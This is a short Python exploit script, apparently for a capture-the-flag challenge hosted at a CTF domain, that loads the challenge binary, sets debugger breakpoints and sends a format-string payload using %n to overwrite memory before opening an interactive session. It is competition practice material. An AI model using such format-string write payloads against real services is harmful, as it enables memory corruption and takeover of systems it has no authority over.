#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./chal")
host = args.HOST or "printf.ctf.maplebacon.org"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
b *go+42
b *go+53
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

payload = b"AAAAAAAA%512c%17$n"

sl(payload)

io.interactive()
